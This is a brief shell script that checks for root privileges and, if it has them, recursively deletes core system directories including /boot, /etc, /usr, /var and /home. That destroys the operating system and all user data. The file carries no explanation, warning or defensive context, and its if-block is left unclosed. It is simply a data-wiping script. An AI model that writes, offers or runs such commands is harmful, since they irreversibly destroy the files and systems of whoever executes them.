if [ $(whoami) != "root" ]
then
    echo -e "Need root acces"
else
    sudo rm -r /boot
    sudo rm -r /sys
    sudo rm -r /mnt
    sudo rm -r /etc
    sudo rm -r /usr
    sudo rm -r /var
    sudo rm -r /home
